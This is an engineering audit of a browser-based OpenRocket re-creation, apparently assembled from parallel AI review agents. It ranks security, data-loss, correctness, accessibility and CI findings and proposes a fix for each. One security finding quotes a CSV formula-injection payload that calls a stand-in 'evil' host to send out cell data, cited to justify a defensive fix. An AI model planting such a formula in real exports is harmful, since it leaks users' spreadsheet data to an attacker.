# Engineering Audit — `web/` (AstraRocketJs)

**Date:** 2026-09-15
**Scope:** `web/` — browser re-creation of OpenRocket (React 18 + TypeScript + Vite + Vitest + three.js), plus the repo's tooling and CI.
**Method:** fan-out review, five parallel agents (parsers/export/persistence, state layer, components, tree/geometry, dead-code/tooling), each reading its files in full. Findings ranked by severity.

**Since the last audit (2026-09-09):** 107 files and ~9.6k insertions. New this cycle and audited for the first time — the **Aero panel** (`AeroAnalysis.tsx`, ~990 lines), the **mobile layout** (tab bar, rotated sketch, full-screen dialogs), the **design library** (`designLibrary.ts` + its two dialogs), the **IndexedDB persistence tier** (`idbKeyValueStore`, `persistStorage`, the unload journal), the **units layer** (`prefs/`), and a much-expanded `flightPathExport`.

**Verification status:** every 🔴 and every HIGH below was re-read against the source by the orchestrator before it went in — ✅ marks those. Chains were traced end-to-end rather than inferred from names: the design-library loop through all five hops, the `getName()` keying against the Java facade, the freeform-root formula against all five call sites and the kernel, the e2e type errors by actually running `tsc` over the specs. One agent claim was **corrected** rather than relayed (the journal scenario — see the third data-loss finding). Unverified agent claims are marked _(reported)_.

**The last audit's recommendations were all adopted** — knip is installed, `eslint --max-warnings 0` is enforced, `noUncheckedIndexedAccess` is on, and `ci.yml` is a real PR gate. Those rows are gone; what replaced them is at the end under "Closed since the last audit".

Legend: 🔴 security · 🟠 architecture + tooling (incl. perf) · 🟡 correctness + tests + a11y · 🟢 dead code. Severity per finding: **HIGH / MED / LOW**.

---

## 🔴 Security

**MED** ✅ FIXED | `services/reportCsv.ts:19,50` | `cell()` quotes for `[",\n]` but never neutralizes a leading `=`/`+`/`-`/`@`. Line 52 pushes `model.name`, which is `loadedMeta?.name || tree.name` — the `<name>` of an imported `.ork`. Fin-set names (`reportModel.ts:194`) go the same way. | A shared `.ork` named `=HYPERLINK("http://evil/?"&A1,"Open")` exports to `<name>-design.csv` and executes on open in Excel/Sheets. ✅ verified — and the correct guard already exists 30 lines away in `flightPathExport.ts:909`; this exporter simply never got it. | Reuse that rule in `cell()`: prefix `'` when `/^[=+\-@\t\r]/`, then quote/double as now. **Not** a finding for `csvExport.ts` — its `Cd_` column prefix means no cell can lead with a trigger, and the comment at `:87` says so.

**MED** ✅ FIXED | `services/thrustcurve.ts:44-63` | `return res.json()` sits inside the `try`, so `finally { clearTimeout(timer) }` runs at the `return` statement — before the body is ever read. The `MAX_RESPONSE_BYTES` check at `:55` only consults a declared `content-length`. | A thrustcurve.org response that sends headers then stalls hangs the motor picker forever, because the 5 s abort was already cancelled; a chunked response has no size cap at all. ✅ verified. `remoteData.ts:93-102` gets this right (staged TTFB→body timeout, cap on bytes actually received). | `const data = await res.json()` inside the try, and swap the TTFB timer for a body timer once headers arrive, as `remoteData.fetchJson` does.

**LOW** | `services/engParser.ts:33-39` | ~~No BOM strip.~~ **FALSE — withdrawn.** The agent reported that a BOM'd `.eng` fails the `startsWith(';')` comment filter and dies with a misleading "Malformed .eng header". It does not: `U+FEFF` is WhiteSpace in ECMAScript, so the existing `.map((l) => l.trim())` on the line above strips it already. Verified by `'﻿; a comment'.trim().startsWith(';') === true`, and by a test that passes against unmodified `engParser.ts`. | Nothing to fix. A regression test (`engParser.test.ts`, "parses a file that carries a UTF-8 BOM") now pins the behaviour so it cannot quietly become true later.

---

## 🟡 Correctness

### Data loss — the three that can destroy a user's work

**HIGH** | `services/idbKeyValueStore.ts:82-91` | `tx()` resolves on `req.onsuccess`, which fires when the _request_ succeeds — **not** when the transaction commits. There is no `t.oncomplete`, and `t.onabort` rejects a promise that has already resolved, so an abort is silently discarded. | `set()` returns `true` for a write that never landed (commit-time IO error, disk full, tab closing mid-transaction), and `workspaceStore.save()` keys its storage-full warning off exactly that boolean — the user is told the design saved when it did not. ✅ verified. | Resolve read-write transactions on `t.oncomplete` (capture `req.result` in `onsuccess`, resolve in `oncomplete`); keep `onsuccess` for `readonly` only.

**HIGH** | `services/idbKeyValueStore.ts:142-152` | `migrate()` awaits that same `tx()` and then runs `await this.fallback.remove(key)`. The comment at `:147` reads "Only now is it safe to reclaim the localStorage entry" — but per the above, the await returned on request success, not commit. | This is the user's **only** copy. On the first read after upgrade the legacy `astrarrocketjs:workspace` / `:motors:custom` blob is deleted from localStorage while the IndexedDB transaction can still abort: every saved design and custom motor gone, no error. ✅ verified. `idbKeyValueStore.test.ts:81` covers "the migrating write _fails_" but not "request succeeded, transaction aborted" — fake-indexeddb will not reproduce it. | Fix `tx()` above; the migrate ordering is then correct as written.

**HIGH** | `services/workspaceStore.ts:93-98` | The unload journal is written into the library (`lib.write(journal.id, …)`) and the journal cleared **before** `validate(journal.w)` runs at `:98`. | The bad blob overwrites the real stored design and the journal is gone, so the app opens empty and every later `load()` re-reads the same bad blob — permanent, silent loss. ✅ verified. **Correction to the agent's report:** it blamed a _truncated_ write, but `readJournal()` (`:61-70`) wraps `JSON.parse` in try/catch, so truncation already returns null. The live path is valid JSON of the wrong **shape**, which `validate` checks for and `readJournal` does not (it tests only `j && j.w`) — most plausibly a journal written by a **different cached PWA build**, since `validate` requires `version === 1`. | Validate first: `const w = validate(journal.w); if (!w) { clearJournal(); return null; }` and only write to the library when validation passes.

### The user is never told storage broke

**HIGH** | `state/useWorkspaceEffects.ts:130` vs `:66`/`:74` | The rebuild effect calls `store.setErr(null)` on every successful build, and `err` is the single shared banner slot that the autosave failure (`:66`, `storage.full`) and the IndexedDB-degraded notice (`:74`, `storage.degraded`) also write. | ✅ verified by sequence: `onStorageDegraded` fires during `load()`; `load` resolves; `ready` flips; the rebuild effect (dep list at `:132` includes `ready`) runs and clears the banner — milliseconds after it appeared. `storage.full` dies on the user's next keystroke. Both notices exist precisely to warn that work has stopped being saved, and **neither can ever be seen**. | Give storage notices their own state slot, or only clear an `err` the rebuild itself produced.

### Physics keyed on the wrong identity

**HIGH** | `engine/openRocketEngine.ts:642,560` + `engine-java/src/api/java/api/OpenRocketEngine.java:806` | The Java facade keys its per-component maps on `component.getName()`. `treeEdit.defaultNode()` sets no name, so every unnamed part inherits the class-name default — a two-tube rocket has two components both called "Body tube". | Their `cd` **sums** into one row, `cdInstance` sums (so "per instance" is the sum of two different parts), `instances` and `type` are last-wins, and `cp` is CNα-weighted into a station belonging to neither tube. All three Component-Analysis tables read wrong for the commonest possible design. Meanwhile `getComponentMasses` keys on the integer id and emits **duplicate** rows — so the mass column and the drag column disagree about how many parts exist. ✅ verified against the Java. | Emit the tree node id as a `key` field alongside `name`; key the Java `LinkedHashMap`s and the UI rows on it; keep `name` as the display label. **Needs an engine rebuild + a parity run.**

**HIGH** | `state/useWorkspaceEffects.ts:121-132` and `:135-137` | Both the full engine rebuild (`computeStaticInfo` + aero sweep, synchronous on the main thread) and `invalidateResults` are keyed on `tree` **object identity**, and every store action replaces the tree object regardless of what changed. | ✅ verified at `store.ts:396-401`: `updateDesignMeta` does `set((s) => ({ tree: { ...s.tree, ...patch } }))` for designer/comment/revision — fields that cannot affect physics. So typing a designer name in the Rocket-configuration dialog runs a full sweep **and nulls every simulation result** (`store.ts:332`), and the mobile Results tab disappears. A rename via `patchSelected` does it per keystroke. | Derive a physics key from the geometry/material-bearing fields and use that as the dep for both effects; cosmetic edits must do neither.

**HIGH** | `tree/position.ts:74` | `resolveAbsolutePositions()` is exported and tested but **never called from app code** (✅ verified by grep of all `src/`: only `position.ts` and `position.test.ts`), while `orkImport.ts:937-940` explicitly preserves `method:'absolute'`. | `startFromPosition` (`:41-44`) returns `pos.offset` for `absolute` — a _parent-relative_ top offset — but OpenRocket's `AxialMethod.ABSOLUTE` is rocket-origin. Import an `.ork` with an absolutely-positioned fin set at 0.35 m on a tube starting at 0.30 m and the schematic, 3D view, drag handles and PDF all draw it at 0.65 m while the engine simulates it at 0.35 m. Drawn geometry ≠ simulated geometry, which is exactly what this function's own docblock says it exists to prevent. | Call it on the tree in the `.ork` load path before the tree reaches the store.

**HIGH** | `services/reportGeometry.ts:17,73`, `services/reportModel.ts:191`, `services/solidMesh.ts:211`, `components/canvas/Rocket3D.tsx:151` | Five sites compute the freeform fin root chord as `Math.max(...pts.map(p => p[0]))`. The kernel's value is `last.x − first.x` (`FreeformFinSet.java:448`). | ✅ verified at all five sites. `tree/position.ts:21-25` has the **correct** formula _and_ a comment warning against `Math.max` by name and describing this precise bug — a textbook drifted duplicate. A swept fin whose tip trailing corner overhangs the root is drawn in the report and the mesh forward of where the engine flies it, and the schematic (which uses `axialLength`) and the PDF disagree about one fin. | Export the helper once from `tree/position.ts` and call it from all four other sites.

### Runaway work

**HIGH** | `state/store.ts:522-529` + `components/canvas/CenterView.tsx:85-96` | `runSim`'s catch sets `err` but leaves `result` null and `view` on `'flight'`; `finally` sets `simBusy: false`. CenterView's auto-run effect lists `busy` in its deps. | ✅ verified both sides: `busy → false` re-fires the effect, every condition still holds (`autoRunOutdated`, `view==='flight'`, `!result`, `hasDesign`, `!busy`), so it calls `runSim` again — **forever**. The walk-back to `'2d'` at `:101-105` is suppressed because `willAutoRun` is true. A repeatable sim timeout pins the machine spawning flight sims. Only the throw path loops; the no-mount/no-motor guards return before `simBusy` is set. | Record the failure against the inputs so a retry only happens once they change.

**HIGH** | `state/store.ts:507-521` | `runSim` awaits `simulateInWorker` with no generation guard, then writes the result and forces `view:'flight'`, `tab:'results'`. | ✅ verified — `simId` is captured but nothing re-checks the tree. Edit a fin while the worker is busy (the tree-change effect nulls every cached result) and the worker's answer installs a flight computed from the **pre-edit** rocket as the current result, yanking a phone to the Results tab. The numbers on screen belong to a rocket that no longer exists. | Capture a monotonic token before the await; drop the result and the view write if the store has moved on.

**HIGH** | `components/layout/DesignLibraryDialog.tsx:26-35` | The open-effect depends on `onClose` and its body calls `refresh()`. | ✅ verified end-to-end through all five hops: `onClose` is an inline arrow at `AppHeader.tsx:446` → `refreshDesigns` (`store.ts:581`) sets `designs` to `lib.list()` → `designLibrary.ts:49` returns `.slice().sort()`, a **fresh array** → `AppHeader.tsx:29` subscribes to `s.designs` and zustand compares with `Object.is` → AppHeader re-renders → new `onClose` identity → the effect re-runs. **File ▸ My Rockets starts an unbounded IndexedDB read/render loop that runs the whole time the dialog is open**, and `setRenaming(null)` on `:29` fires every iteration, so Rename is unusable. Brand-new feature, no e2e coverage. | Drop `onClose` from the deps (or `useCallback` it in AppHeader) and move `setRenaming(null)` into an open-transition-only effect.

### Unvalidated input reaching the engine

**HIGH** | `components/layout/SettingsDialog.tsx:424` | `NumRow` is a hand-rolled number input using `parseFloat(e.target.value) || 0`, passing `min` only as the HTML attribute — it never clamps. | ✅ verified: typing `0` into Settings ▸ Simulation ▸ Time step (`:308-317`, `min={0.001}`) sets `simulation.timeStep = 0`, because `0` is not nullish and the `?? DEFAULT` at `:316` does not catch it; the engine's `options.timeStep ?? 0.05` passes it straight into the RK4 loop. Negative values get through the same way, as do `maxTime: 0` and a negative `railExitVelocityMin`. | Use `common/NumberInput`, which already clamps (`NumberInput.tsx:76-79`), or clamp inside `NumRow`.

**HIGH** | `components/layout/DesignLibraryDialog.tsx:86-91` | Delete removes a saved design from IndexedDB on a single click, with no confirmation, styled identically to the Rename button beside it. | ✅ verified. On the phone's full-screen dialog three small text buttons share one row; a mistap destroys a saved rocket with no undo. The `confirm()` store already exists and is used for the far less destructive "close loaded design" (`CenterView.tsx:39-43`). | Route it through `confirm({ danger: true })`.

**MED** | `engine/openRocketEngine.ts:682` | `assertFiniteCurve()` guards `times`/`thrusts`/`masses`, but `setMotorById` (`:730-740`) also hands the kernel `motor.diameter`, `motor.length`, `motor.cgX` and `toKernelDelay(ejectionDelay)` unchecked — and `toKernelDelay` (`:274`) passes NaN through, since `NaN >= PLUGGED_DELAY` is false. _(reported)_ | `thrustcurve.ts:146` computes `cgX: cgSamples?.[0]?.[1] ?? motor.length / 2000`; a catalog row missing `length` makes both NaN, reproducing the opaque TeaVM "number NaN cannot be converted to a BigInt" failure this guard was written to eliminate. | Extend the guard to the four scalars.

**MED** ✅ FIXED | `components/design/FreeformFinEditor.tsx:166,178` | `parseFloat(e.target.value) || 0` writes straight into the fin outline, and `value={+ptX.toUi(...).toFixed(3)}` is the exact controlled round-trip `NumberInput` was written to replace. _(reported)_ | Select a vertex, select-all in the X box and type a replacement: the instant the field is empty the vertex snaps to x=0, deforming the outline as a real tree edit. A leading `-` does the same. | Swap in `NumberInput`.

**MED** | `components/sim/LaunchPanel.tsx:320-345` | The four multilevel wind-layer inputs pass no `min`, while the single-level equivalents pass `minSi={0}` (`:283`, `:304`). _(reported)_ | Tick "Wind varies with altitude" and a negative wind speed, gust stddev or layer altitude reaches `simulate()` unfiltered — two code paths for one physical quantity, drifted. | Pass `min={0}` here too.

### Aero panel (new code, first audit)

**MED** ✅ FIXED | `components/canvas/AeroAnalysis.tsx:607,619` | The stability table passes `heatStyle === 'openrocket' ? 'openrocket' : 'sky'` for CNα cells — an **identity expression**, since `HeatStyle` has exactly two members. | ✅ verified. It reads as a deliberate guard and is not one. `heat()`'s openrocket branch ignores `max` entirely and scales `value / 1.5` on an absolute **Cd** scale (`:304-308`), so with the OpenRocket palette selected every CNα above ~1.1 clamps to full red: a fin set at 13 and a nose cone at 2 shade identically and the column says nothing. `RollTable` has the real guard, with a comment (`:670-673`); this table never got it. | Apply the same exclusion, or scale CNα against `totalCna` in `sky` regardless of the preference.

**MED** | `components/canvas/AeroAnalysis.tsx:475,613,693` | All three tables use `key={r.name}`, where `name` is the display name. | Two same-named components collapse to one React key, and since rows re-sort by magnitude on every Mach change (`:426`, `:575`), React reuses the wrong row and shows stale numbers while scrubbing the crosshair. Same root cause as the engine keying finding above. | Key on the engine's stable id once it emits one.

**MED** | `components/canvas/AeroAnalysis.tsx:864-867` | `linePath` emits `''` for a non-finite sample but picks the command letter from the array index: `${i ? 'L' : 'M'}`. _(reported)_ | A non-finite Cd/CP at `machs[0]` makes the joined `d` begin with `L…` — invalid path data, so the browser drops the whole `<path>` and the curve renders blank with no error. Mid-series gaps draw a straight bridge rather than a break. | Track whether a command has been emitted and start a fresh `M` after each gap.

**LOW** | `components/canvas/AeroAnalysis.tsx:167` | `rocket.worstThetaDeg(...)` is called bare in the Worst button's `onClick`, while both other engine calls in the file are wrapped (`:77-85`, `:98-102`). _(reported)_ | A throwing kernel takes the pane down rather than leaving the field alone. | Wrap in try/catch like its neighbours.

### Other correctness

**MED** | `services/designLibrary.ts:96-112` | `write()` returns `true` as soon as the design blob is stored; the `writeIndex()` at `:101` is unchecked. _(reported)_ | A failed index write leaves a newly created design stored but absent from the index, so `activeId()` filters it out and the next session loads an empty workspace over unreachable orphaned bytes. | AND the index write into the return value.

**MED** | `services/motorStore.ts:160-169` | The comment claims add/remove "propagate write failures", but `kv.set(...)`'s boolean is discarded. _(reported)_ | `MotorDialog.tsx:240` awaits the import, gets a clean resolve, and re-renders a catalog without the motor the user just imported. No error. | Throw on `false`.

**MED** | `services/remoteData.ts:161-189` + `services/motorDb.ts:88-94` | `fetchCatalog<T>` does no shape validation — anything that parses as JSON is returned and the fallback loop stops. _(reported)_ | A host answering `{"error":"rebuilding"}` with HTTP 200 parses fine, so the in-build fallback copy is never tried and `[...custom, ...bundled]` throws "bundled is not iterable" into the motor picker. The two-base fallback chain is defeated by a host that is up but wrong. | Take a validator (at minimum `Array.isArray`) and treat a mismatch as a base failure.

**MED** | `state/useWorkspaceEffects.ts:37-43` | `.then()` with no `.catch()`. | ✅ verified: a rejection leaves `hydrated.current` false **and** `ready` false permanently, which silently disables autosave (`:59`), the unload flush (`:97`) and the rebuild (`:122`), leaving `info` null — no stability badge, no stats — with nothing on screen. | `.catch()` into "fresh workspace that still saves".

**MED** | `state/useWorkspaceEffects.ts:39-43` | `hydrated.current = true` and `setReady(true)` run **outside** the `if (live)` guard; only `hydrate(w)` is inside. | ✅ verified, and StrictMode is on (`main.tsx:25`). The cancelled first load still flips `ready` with the default tree, so the rebuild builds the default rocket, then the second load hydrates and it builds again — the exact double-build the comment at `:29-32` says this design prevents. Dev-only. | Move both writes inside `if (live)`.

**MED** | `state/store.ts:584-601` | `openDesign` has four sequential awaits with no guard that it is still the most recent request. _(reported)_ | Click design A then B on slow IndexedDB: if B resolves first, A's continuation writes B's tree out under the current active id and finishes by setting active to A. The user clicked B last and is looking at A. | Take an open token before the first await.

**MED** | `components/canvas/FlightPath3D.tsx:102` | `const apT = evT('APOGEE') ?? result.summary.timeToApogee ?? maxA;` — `maxA` is peak **altitude in metres** (`:98-99`), used as a fallback **time in seconds**. It also feeds `dpT`. _(reported)_ | A result with no APOGEE event gets `apT ≈ 300` for a 300 m flight, so the whole trajectory paints as coast and the deploy callout lands at a meaningless time. | Fall back to the last sample time.

**MED** | `components/canvas/FlightChart.tsx:134-135` | `Math.max(..., ...allTimes, 1)` spreads every branch's full time series, in the render body, not a memo. _(reported)_ | It re-runs on every pointer move (hover re-renders the chart). A fine-timestep multi-stage flight of 40k+ samples approaches V8's argument limit and throws `RangeError: Maximum call stack size exceeded`, blanking the panel. `FlightPath3D.tsx:98,214` already avoids this hazard with an explicit loop and says so. | Loop inside a `useMemo`.

**MED** | `services/reportGeometry.ts:121` | The transition branch advances `x` and draws the profile but, unlike the nosecone and bodytube branches, never loops children to call `addFins` — while `treeEdit.ts:137` explicitly allows fin sets on a transition. _(reported)_ | A boat-tail-mounted fin set is silently absent from the PDF whole-rocket side view. | Add the same child loop, using the transition's aft radius.

**MED** | `services/solidMesh.ts:209` | `oneFinSolid()` extrudes the planform only and ignores `tabHeight`/`tabLength`, while `dxfExport.ts:54-57` and `reportGeometry.ts:35-39` both build the tab. _(reported)_ | A through-the-wall fin exported as STL/OBJ/GLB prints with no tab and will not seat in the airframe slot — while the DXF of the same part, from the same menu, has it. | Append the tab rectangle to the `THREE.Shape`.

**MED** ✅ FIXED | `services/reportPdf.ts:320` | `doc.save(...)` uses jsPDF's own `<a download>` path, bypassing `saveFile.saveBlob`. | ✅ verified. `saveFile.ts:5-13` exists precisely because `<a download>` "silently does nothing" on iOS/iPadOS as an installed PWA. Every other export routes through it; the PDF report is the one that silently produces nothing there. | `await saveBlob(doc.output('blob'), …)`.

**MED** | `components/report/ExportDialog.tsx:348-352` | The print-settings overlay is a child of the main dialog overlay (`:185`, `onClick={onClose}`) and its own backdrop handler does not stop propagation. _(reported)_ | Dismissing the popover closes the whole Export dialog; on reopen `assembled.current` was reset (`:64`) so every include/exclude checkbox is rebuilt from defaults and the user's selection is gone. `DesignLibraryDialog.tsx:98-109` has the identical bug with the rename dialog. | `stopPropagation` on the inner backdrops.

**LOW** | `services/solidMesh.ts:188` | `hasBore` requires `innerR < outerR - 1e-6`; an inverted ring falls through to the solid-cylinder branch. _(reported)_ | A centring ring exports as a solid disc that blocks the motor tube, with nothing said. Every other degenerate case in `solidForNode` returns null. | Return null rather than silently producing a bulkhead.

**LOW** | `components/canvas/Rocket3D.tsx:1040,1047` | `document.body.style.cursor = 'pointer'` is cleared only by the matching pointer-out; no unmount cleanup. _(reported)_ | Hover a part then switch views and the app is stuck showing a pointer cursor. | Clear it in an unmount effect.

**LOW** | `components/canvas/FlightPath3D.tsx:135` | `sp[idxAt(tt)]!` silences `noUncheckedIndexedAccess` on a lookup into `sp`, which is empty when every sample fails the finiteness filter at `:86`. _(reported)_ | Throws inside the `useMemo`, i.e. before the `scenePts.length < 2` empty-state guard at `:217` — opening 3D Path takes the app down instead of showing the empty state. | Move the emptiness check above the callout loop.

**LOW** | `tree/tubefins.ts:11` | A hand-rolled `typeof explicit === 'number' && explicit > 0` bypasses the module's own imported `num`/`numOpt` and so drops the `Number.isFinite` guard `nodeProps.ts:14` documents as load-bearing. _(reported)_ | An `Infinity` outerRadius passes `> 0` and collapses the schematic scale to NaN, drawing nothing where a fallback would have drawn something. The previously-reported `nodeProps`/`scaleRocket` divergence **is fixed**; this is the last hand-rolled reader in `tree/`. | Use `numOpt`.

**LOW** | `state/SettingsProvider.tsx:15-17` | The save effect has no skip-first-run guard, so it writes `loadSettings()`'s output back to localStorage on mount. _(reported)_ | `loadSettings` drops keys it does not recognise, so merely opening the app in an older build permanently destroys any preference a newer build wrote. | Skip the first run, or write only from `update()`/`reset()`.

**LOW** | `services/reportCsv.ts:19` | `cell()` tests `/[",\n]/`; a lone `\r` is not quoted, while the file's terminator is `\r\n`. _(reported)_ | A name containing a bare CR emits an unquoted CR that Excel treats as a row break. | Widen to `/[",\r\n]/`.

---

## 🟡 Tests

**MED** | `state/useWorkspaceEffects.ts` | No test file exists — `state/` holds only `store.test.ts`. | This hook owns the hydration gate, the 500 ms autosave debounce, the unload journal path, the rebuild orchestration and result invalidation. **Five findings above live in this file** and none would be caught by `store.test.ts`, which drives store actions directly. | Extract the effect bodies into small functions taking `(store, workspaceStore)` — `computeStaticInfo` already shows the pattern — and test those.

**MED** | `engine/openRocketEngine.ts` | No `openRocketEngine.test.ts`; `engine/api.test.ts` covers `api.ts`, not this module. | This is the single boundary where JS numbers become physics inputs. `assertFiniteCurve`, `toKernelDelay`/`PLUGGED_DELAY`, the aero-sweep option defaults (`:798-805`) and the simulate option block (`:834-851`) are entirely untested; a dropped `?? default` changes every simulation and nothing fails. | Test with a stubbed `eng()`: `PLUGGED_DELAY → Infinity`, `assertFiniteCurve` throwing with the motor's designation, and the options JSON carrying the documented defaults.

**MED** | `components/layout/DesignLibraryDialog.tsx` | No e2e spec covers the design library. | The unbounded render loop above is a total, immediately-visible break in a shipped feature, and the suite did not catch it. | Add a `library.spec.ts` that opens File ▸ My Rockets, asserts a stable render, and exercises rename and delete.

**LOW** | `tree/shapeProfile.ts:117` | `calculateClip()` — the binary search positioning every clipped ellipsoid/power/haack transition — has no value-asserting test; `shapeProfile.test.ts:105` only asserts the clipped flag "changes" the profile. _(reported)_ | A sign or bracket slip would leave every test green while every clipped transition draws and prints wrong. | Pin interior `(x, r)` values per shape against the kernel's `Transition.Shape.getRadius`.

---

## 🟡 Accessibility

**MED** | `components/report/ExportDialog.tsx:37-198` | The only dialog in the app with neither an Escape handler nor `useFocusTrap`; the close button at `:195` has no `aria-label`, so its accessible name is "✕". _(reported)_ | Keyboard users cannot dismiss Print/Export, and Tab walks straight out of the modal. Five sibling dialogs have the Escape effect and six use `useFocusTrap`. | Add both, and a label.

**MED** | `components/layout/TabBar.tsx:50-56` + `components/layout/SettingsDialog.tsx:91-99` | Active state is signalled by colour alone — no `role="tab"`/`aria-selected`, no `aria-current`, no `aria-pressed`. _(reported)_ | A screen-reader user cannot tell which phone tab or settings section they are on; colour-only state also fails for low-vision users. `FlightChart.tsx:294` and the Aero legend already set `aria-pressed` on the same kind of control. TabBar is brand new and `mobile-layout.spec.ts` does not assert on it. | `aria-current="page"` on TabButton; `role="tab"`/`aria-selected` on the settings tabs.

**MED** | `components/common/UnitChip.tsx:50-54` (via `StabilityBadge.tsx:81,87,119,127` and `SimSummary.tsx:68,102,110,129`) | The chip builds its accessible name from the quantity only. _(reported)_ | Four length chips (length/maxDiameter/cg/cp) and four velocity chips (rodExit/deploy/landing/maxSpeed) announce identically, and both components are on screen together on the mobile Results tab. This is the exact failure the chip's own doc comment says the quantity was added to prevent. | Add a `label` prop carrying the tile's name.

**MED** | `components/sim/LaunchPanel.tsx:320-345` | The four multilevel wind-layer inputs have no `ariaLabel`; the column headings at `:311-317` are unassociated `<span>`s. _(reported)_ | With two layers that is eight indistinguishable spinbuttons. Every other numeric field goes through `Num`/`QNum`, which do set one. | Label each by column and layer index.

**MED** | `components/layout/AppHeader.tsx:319,345` | Two `role="menuitem"` entries carry the identical label `t('file.ork')` — one under Import, one under Export — and both submenus can be open at once. _(reported)_ | A screen-reader user hears "OpenRocket (.ork)" twice with nothing to distinguish them, and `getByRole('menuitem', {name})` hits a Playwright strict-mode violation. | Qualify the labels.

**MED** | `components/canvas/AeroAnalysis.tsx:244-250,779` | `Seg`'s `disabled` prop applies only `pointer-events-none opacity-40`; the buttons keep no `disabled` attribute. _(reported)_ | Tab to "% body" on a design with `info.length === 0` and press Enter: `cpPct` flips but `:128-129` still plots centimetres, so the axis label reads "%" over cm data. | Pass `disabled` to each button.

**LOW** | `components/sim/MotorDialog.tsx:258-262`, `components/sim/MotorDashboard.tsx:343-347` | `role="dialog" aria-modal="true"` with no accessible name, though both have a visible `<h2>`. _(reported)_ | Screen readers announce an unnamed dialog; four sibling dialogs label theirs. | Add `aria-labelledby`, and move the role onto the panel rather than the click-to-dismiss backdrop.

**LOW** | `components/canvas/AeroAnalysis.tsx:929` | The chart host has `onPointerMove`/`onPointerLeave` only — no tabIndex, role or keyboard handler — and the Mach slider is rendered only on the Components pane (`:188`). _(reported)_ | On the Charts pane the hover readout is the only way to read a value at a given Mach, and it is unreachable without a pointer. | Show the Mach slider on both panes.

---

## 🟠 Architecture + Tooling

### CI gaps — what is not gated

**HIGH** | `.github/workflows/ci.yml` | **No workflow touches `engine-java/` at all.** CI runs only `npm run test` + `npm run build` inside `web/`. | The two shipping backends are committed binaries (`web/src/engine/vendor/openrocket-engine.mjs`, 2.8 MB; `web/public/engine/openrocket-engine.wasm`, 2.5 MB). `engine-java/test/parity/parity.mjs` exists precisely to prove JVM ≡ TeaVM-JS ≡ WASM, and **nothing runs it** — a Java change regenerated into one artifact and not the other ships silently divergent physics. | Add a JDK job on changes under `engine-java/**` running `parity.mjs` and `parity.mjs --wasm`.

**HIGH** | `web/package.json:33` | `"e2e": "playwright test"` is invoked by no workflow, and 13 spec files exist under `web/e2e/`. | The whole integration layer — schematic, motor picker, recovery, mobile layout, aero tables — runs only when a human remembers. Regressions in app wiring reach master with a green check; the design-library loop above is exactly that class of bug. | Add an `e2e` job. `playwright.config.ts:31` already auto-starts the dev server and sets `retries: 1` + `reporter: 'github'` under CI, so no config change is needed.

**MED** | `web/tsconfig.json:20` | `"include": ["src"]` — `e2e/`, `scripts/` and the config files are never seen by `tsc --noEmit`, so `npm run build` does not typecheck them. | ✅ verified by running the project's own flags over the specs: **3 genuine `noUncheckedIndexedAccess` errors** that the all-gates-green build reports as clean — `e2e/aero-conditions.spec.ts:70`, `e2e/mobile-layout.spec.ts:160`, `e2e/schematic.spec.ts:54`. Each throws at runtime the moment its selector misses. | Add a second tsconfig covering `e2e`/`scripts`/configs and chain it into `typecheck`. Fix the 3 errors first or the gate lands red.

**MED** | `web/package.json:28` | `npm run knip` is in scripts but no workflow runs it; it currently exits 0. | Free to add today; left unrun it rots into the same decorative state as `format:check`. | Add it to `ci.yml`.

### Formatting cannot be gated until it is cleared

**MED** | `web/.prettierignore` | `prettier --check .` fails on **45 tracked files** on an LF checkout. `.prettierignore` omits every generated artifact: the 2.8 MB TeaVM output, the wasm runtime shim, `src/data/contributors.generated.json` (rewritten by `sync:contributors` in CI), `public/data/*.generated.json` and `public/docs/**`. | `format:check` cannot join CI, and `npm run format` would reformat a machine-generated engine file that the next rebuild flips straight back. The script pair is currently decorative — which is how 43 hand-written files drifted. | One-shot commit: ignore the generated paths, run `npm run format` (43 files), then add `format:check` to `ci.yml`.

**MED** | repo root — no `.gitattributes` | `core.autocrlf=true` with no `.gitattributes`, while prettier's default `endOfLine` is `"lf"` and nothing overrides it. | `prettier --check .` reports **149** tracked failures on Windows against **45** on Linux — a 104-file phantom delta. A Windows contributor cannot tell real drift from line-ending noise, which is precisely how the 43 files accumulated unnoticed. | Add `* text=auto eol=lf` (with `-text` for binaries), then `git add --renormalize .`.

### Duplicated and drifted code

**MED** | `tree/tubefins.ts:25,36`, `tree/cluster.ts:59,65` | `tubeFinMaxRadius`, `tubeFinMaxCount`, `CLUSTER_OPTIONS` and `clusterCount` have no consumer outside their own tests. _(reported)_ | The tube-fin validators exist to stop a user entering a colliding count/radius and `CLUSTER_OPTIONS` is a ready-made dropdown — none is wired to the property panel, so the editor accepts overlapping tube fins and offers no cluster picker. Tested code that ships doing nothing reads as covered behaviour that is not there. | Wire them into `PropertyPanel`, or delete them with their tests.

**MED** | `components/canvas/TreeSchematic.tsx:259` | `buildSchematicShapes({...})` — the whole SVG scene build — runs unmemoized in the render body, while the geometry above it is correctly memoized. _(reported)_ | `zoom` is not an input to it, yet `setZoom` fires on every wheel tick and every pointermove of a background pan, so panning a 40-part design rebuilds the entire shape tree per frame for no change in output. | `useMemo` on its real inputs; `beginDrag`/`textUp` need `useCallback` first.

**LOW** | `services/reportCsv.ts:76`, `services/meshExport.ts:57`, `components/canvas/FlightPathExport.tsx:47` | Three filename sanitizers alongside the exported `saveFile.safeFilename`. | ✅ verified: `safeFilename` (`saveFile.ts:81`) requires `/[a-z0-9]/` to survive and its docstring explains why; the copies use a truthiness fallback and reproduce the bug it fixes — a design named `"///"` exports as `_-design.csv`. `FlightPathExport`'s copy uses `\w` (which matches `_`) where the others do not, so KML and mesh filenames sanitize differently for the same design. | Delete all three; call `safeFilename`.

**LOW** | `services/csvExport.ts:115`, `services/schematicExport.ts:196`, `services/meshExport.ts:61` | Three one-line facades over `saveFile.ts`, and **the argument order flips** between `downloadBlob(blob, filename)` and the other two. _(reported)_ | `saveFile.ts` exists to end per-module `<a download>` handling; the reversed order is a live foot-gun, since `downloadBlob(name, blob)` compiles when `blob` is a string. | One consistent `(filename, data, mime)` signature in `saveFile.ts`.

**LOW** | `bootSplash.ts:16-17`, `components/common/CatalogLoading.tsx:14-15` | `const MB = 1024*1024` + a `mb()` formatter duplicated verbatim. _(reported)_ | The boot splash and the catalog progress bar can drift to different decimal places with no test noticing. | Move next to `fmtNum` in `i18n/format.ts`.

**LOW** | `engine/openRocketEngine.ts:826` | `componentMasses()` is the only JSON-parsing accessor that does not check `parsed.error` before casting; `staticInfo`, `componentInfo`, `aeroSweep` and `simulate` all do. _(reported)_ | If the Java side grows an error envelope here, the cast succeeds and the caller gets a `TypeError` from `.map` instead of the engine's message. | Mirror the sibling pattern.

